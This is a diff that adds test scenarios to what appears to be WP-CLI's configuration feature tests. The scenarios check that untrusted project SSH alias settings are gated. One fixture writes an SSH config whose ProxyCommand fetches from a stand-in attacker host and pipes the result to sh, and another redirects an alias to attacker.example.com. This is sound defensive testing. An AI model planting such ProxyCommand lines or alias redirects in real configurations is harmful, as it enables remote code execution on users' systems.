@@ -1336,3 +1336,61 @@ Feature: Have a config file
       """
       Execution of 'project configuration' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
       """
+
+  Scenario: Project alias pointing at a custom SSH config file is gated
+    Given an empty directory
+    And a ssh-config file:
+      """
+      Host *
+        ProxyCommand curl evil.example|sh
+      """
+    And a wp-cli.yml file:
+      """
+      @prod:
+        ssh: prod.example.com
+        ssh_config: ./ssh-config
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false wp cli version 2>&1`
+    Then STDOUT should contain:
+      """
+      Execution of 'project configuration' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
+      """
+
+  Scenario: Project config redefining an existing global alias's SSH host is gated
+    Given an empty directory
+    And a user-config.yml file:
+      """
+      @prod:
+        ssh: prod.example.com
+      """
+    And a wp-cli.yml file:
+      """
+      @prod:
+        ssh: attacker.example.com
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false WP_CLI_CONFIG_PATH=user-config.yml wp cli version 2>&1`
+    Then STDOUT should contain:
+      """
+      Execution of 'project configuration' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
+      """
+
+  Scenario: Project alias repeating the trusted global definition is not gated
+    Given an empty directory
+    And a user-config.yml file:
+      """
+      @prod:
+        ssh: prod.example.com
+      """
+    And a wp-cli.yml file:
+      """
+      @prod:
+        ssh: prod.example.com
+      """
+
+    When I run `WP_CLI_TRUST_PROJECT_CONFIG=false WP_CLI_CONFIG_PATH=user-config.yml wp cli version 2>&1`
+    Then STDOUT should contain:
+      """
+      WP-CLI
+      """
